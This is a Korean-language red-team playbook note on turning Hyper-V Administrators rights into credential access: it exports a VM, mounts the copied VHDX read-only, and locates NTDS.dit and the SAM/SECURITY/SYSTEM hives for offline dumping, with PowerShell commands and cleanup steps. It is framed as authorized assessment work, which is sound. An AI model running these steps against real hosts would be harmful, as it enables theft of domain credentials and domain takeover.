---
aliases: ["Hyper-V Administrators 가상 DC 디스크 수집"]
tags:
  - 환경/windows
시작조건: ["Hyper-V 호스트의 Windows 세션 확보", "Hyper-V Administrators 그룹이 현재 token에 반영됨"]
필요권한: ["대상 Hyper-V 호스트의 Hyper-V Administrators 또는 동등한 VM export·disk 관리 권한", "분석 호스트의 VHD read-only mount 권한"]
필요조건: ["대상 VM과 연결 VHDX 식별", "export 전체를 저장할 빈 전용 경로와 충분한 공간", "민감한 VM 복제·분석이 승인된 범위"]
결과: ["VM 구성·checkpoint·가상 디스크의 export 사본", "read-only mount에서 확보한 NTDS.dit·SYSTEM 또는 SAM·SECURITY·SYSTEM 후보", "오프라인 credential 분석 입력"]
---

# Hyper-V VM 내보내기와 가상 디스크 오프라인 수집

## 한 줄 판단

현재 token에 Hyper-V Administrators 권한이 반영되고 승인된 VM을 관리할 수 있다면, 실행 중인 원본 VHDX를 직접 조작하지 않고 VM을 전용 경로로 export한 뒤 사본 디스크만 read-only로 mount하여 오프라인 credential 자료를 수집한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치 | 대상 VM을 관리하는 Hyper-V 호스트의 PowerShell | `hostname`, `Get-VM -Name '<VM_NAME>'` | 관리 호스트와 guest VM을 구분하고 필요한 CIM session 확인 |
| 현재 계정 | Hyper-V Administrators SID가 현재 token에 반영됨 | `whoami /groups`, `Get-VM` 실제 성공 | 그룹에 추가된 직후라면 새 로그온 token으로 재확인 |
| 대상 VM | 승인 범위의 VM 이름·ID와 연결 VHDX 경로 식별 | `Get-VM`, `Get-VMHardDiskDrive` | 이름 중복, checkpoint disk와 base disk 관계를 확인 |
| 저장 공간 | export 전체를 담을 빈 전용 directory와 충분한 free space | 대상 path 부재와 volume free space 확인 | 운영 volume 고갈 위험이 있으면 중단하고 승인된 별도 volume 사용 |
| 분석 안전성 | export된 사본 VHDX를 read-only로 mount | export path 아래 exact VHDX 선택, `Mount-VHD -ReadOnly` | 실행 중인 원본 VHDX를 mount·copy하지 않음 |
| guest 역할 | DC인지 member/workstation인지 식별 | VM 이름만 믿지 말고 mounted Windows tree와 파일 존재 확인 | NTDS와 로컬 SAM 경로를 혼용하지 않음 |

Microsoft는 Hyper-V Administrators에 Hyper-V 기능의 완전한 접근을 부여하며, Domain Controller에서 이 그룹을 사용하지 말고 비워 둘 것을 권고한다. 그룹 멤버십 자체와 특정 VM의 export 성공, guest 데이터 접근, credential 추출은 별도 단계로 판정한다.

## 실행

### 1. 현재 token과 VM·disk 기준선 확인

```powershell
whoami /groups | Select-String 'Hyper-V Administrators|S-1-5-32-578'
Get-VM -Name '<VM_NAME>' | Select-Object Name,Id,State,Status,Path
Get-VMHardDiskDrive -VMName '<VM_NAME>' | Select-Object VMName,ControllerType,ControllerNumber,ControllerLocation,Path
Test-Path -LiteralPath '<EXPORT_ROOT>'
Get-Volume -DriveLetter <EXPORT_DRIVE> | Select-Object DriveLetter,SizeRemaining,Size
```

확인할 출력:

- 현재 token의 SID `S-1-5-32-578`, 정확한 VM ID·상태와 연결 disk path.
- `<EXPORT_ROOT>`는 이번 작업 전 존재하지 않아야 한다. 기존 directory를 export 대상으로 재사용하지 않는다.
- checkpoint가 있으면 현재 guest 상태가 AVHDX chain에 걸쳐 있을 수 있다. base VHDX 하나만 복사해 현재 상태를 얻었다고 판단하지 않는다.

### 2. VM을 전용 경로로 export

```powershell
Export-VM -Name '<VM_NAME>' -Path '<EXPORT_ROOT>'
Get-ChildItem -LiteralPath '<EXPORT_ROOT>' -Recurse -File |
  Select-Object FullName,Length,LastWriteTime
```

확인할 출력:

- export 아래 VM configuration, virtual disk와 존재할 경우 checkpoint file이 생성된다.
- `Export-VM`은 실행 중이거나 중지된 VM을 export할 수 있지만, 큰 VM에서는 I/O·용량 부담이 생긴다. 완료 출력과 파일 크기를 확인하기 전에 export 성공으로 기록하지 않는다.
- export 사본 생성은 guest의 현재 사용자 credential을 추출했다는 뜻이 아니다.

### 3. export 사본 VHDX를 read-only로 mount

원본 `Get-VMHardDiskDrive` 경로가 아니라 `<EXPORT_ROOT>` 아래에서 확인한 exact VHDX를 사용한다.

```powershell
$mountedDisk = Mount-VHD -Path '<EXPORTED_VHDX_PATH>' -ReadOnly -PassThru |
  Get-Disk
$mountedDisk | Get-Partition | Get-Volume |
  Select-Object DriveLetter,FileSystemLabel,FileSystem,Size
```

확인할 출력:

- `OperationalStatus`, disk number와 할당된 volume. read-only 여부와 exact VHDX path를 기록한다.
- BitLocker·다른 volume encryption이 적용되어 있으면 mount와 파일 read는 별개다. 복구 key 없이 우회되었다고 판단하지 않는다.

### 4. guest 역할별 오프라인 자료 확인

mounted Windows volume의 drive letter를 `<MOUNTED_WINDOWS_DRIVE>`로 지정한다.

```powershell
Get-Item -LiteralPath '<MOUNTED_WINDOWS_DRIVE>:\Windows\NTDS\ntds.dit' -ErrorAction SilentlyContinue
Get-Item -LiteralPath '<MOUNTED_WINDOWS_DRIVE>:\Windows\System32\config\SYSTEM'
Get-Item -LiteralPath '<MOUNTED_WINDOWS_DRIVE>:\Windows\System32\config\SAM' -ErrorAction SilentlyContinue
Get-Item -LiteralPath '<MOUNTED_WINDOWS_DRIVE>:\Windows\System32\config\SECURITY' -ErrorAction SilentlyContinue
```

확인할 출력:

- DC image에서는 `NTDS.dit`와 같은 guest의 `SYSTEM` hive를 한 쌍으로 취급한다.
- member server·workstation image에서는 `SAM`, `SECURITY`, `SYSTEM`을 같은 guest·시점의 세트로 취급한다.
- 파일 존재만으로 hash·key가 추출되거나 현재 유효하다고 판단하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| VM export와 VHDX 사본 확인 | Hyper-V 관리 권한으로 guest disk 사본 생성 | 오프라인 분석 대상 확보 | 사본만 read-only mount하고 원본 VM은 변경하지 않음 |
| `NTDS.dit`와 같은 image의 SYSTEM hive 확인 | DC credential database 분석 입력 확보 | 도메인 credential 후보 파일 | [[NTDS.dit 덤프]]의 기존 파일 오프라인 분석 경로 사용 |
| SAM·SECURITY·SYSTEM 세트 확인 | 로컬 계정·LSA secret 분석 입력 확보 | 로컬 credential 후보 파일 | [[Windows SAM SECURITY SYSTEM 덤프]]에서 같은 시점 hive 세트 검증 |
| `Get-VM` 접근 거부 | 그룹이 현재 token에 없거나 VM ACL·관리 경로 미충족 | Hyper-V 관리 미확인 | 그룹 디렉터리 상태와 새 로그온, 대상 host를 확인 |
| export 공간 부족·부분 파일 | export 완료 전 실패 | 불완전 사본 | 분석하지 말고 exact partial export를 정리한 뒤 저장 공간 재평가 |
| mount는 성공했으나 Windows volume을 읽지 못함 | encryption·filesystem·checkpoint chain 조건 미충족 | guest 파일 미확인 | volume 상태와 승인된 복호화 입력을 확인하고 우회 성공으로 기록하지 않음 |

## 변경 영향과 복구

분석을 마치면 exact VHDX를 먼저 dismount하고, 이번 실행에서 만든 export root만 제거한다. 기존 VM configuration·checkpoint·원본 VHDX는 삭제하거나 합치지 않는다.

```powershell
Dismount-VHD -Path '<EXPORTED_VHDX_PATH>'
Get-VHD -Path '<EXPORTED_VHDX_PATH>' | Select-Object Path,Attached
Remove-Item -LiteralPath '<EXPORT_ROOT>' -Recurse
Test-Path -LiteralPath '<EXPORT_ROOT>'
```

`Attached`가 `False`이고 마지막 `Test-Path`가 `False`여야 local export 정리가 확인된다. 민감한 파일을 별도 분석 호스트로 복사했다면 그 exact 사본과 도구 산출물은 해당 분석 절차에서 별도로 정리한다. export 과정의 Hyper-V·Windows event와 저장장치 I/O 영향은 directory 삭제로 되돌릴 수 없다.

## 후속 공격 연결

- DC image의 NTDS·SYSTEM: [[NTDS.dit 덤프]]
- member/workstation image의 hive: [[Windows SAM SECURITY SYSTEM 덤프]]
- 추출된 hash·key의 사용처: [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 관련 도구

- [[powershell]]
- [[impacket-secretsdump]]

## 관련 상태 라우터

- [[Windows 위임 운영 그룹 확인 후 권한 경로 선택]]
- [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 참고 링크

- [Microsoft Learn: Hyper-V Administrators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#hyper-v-administrators)
- [Microsoft Learn: Export and import virtual machines](https://learn.microsoft.com/en-us/windows-server/virtualization/hyper-v/deploy/export-and-import-virtual-machines)
- [Microsoft Learn: Mount-VHD](https://learn.microsoft.com/powershell/module/hyper-v/mount-vhd)
- [Microsoft Learn: Dismount-VHD](https://learn.microsoft.com/powershell/module/hyper-v/dismount-vhd)
